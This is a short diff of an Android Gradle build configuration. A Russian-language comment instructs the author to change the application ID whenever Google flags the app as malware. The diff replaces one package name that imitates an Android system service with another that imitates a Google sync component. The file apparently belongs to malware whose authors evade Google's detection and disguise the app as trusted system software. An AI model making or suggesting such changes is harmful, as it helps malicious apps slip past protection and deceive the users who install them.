@@ -6,7 +6,7 @@ android {
 
     defaultConfig {
         // Каждый раз меняй этот ID, если Google пишет "Вредоносное ПО"
-        applicationId "com.android.system.core.service" 
+        applicationId "com.google.android.sync.v18" 
         minSdk 21
         targetSdk 34
         versionCode 1
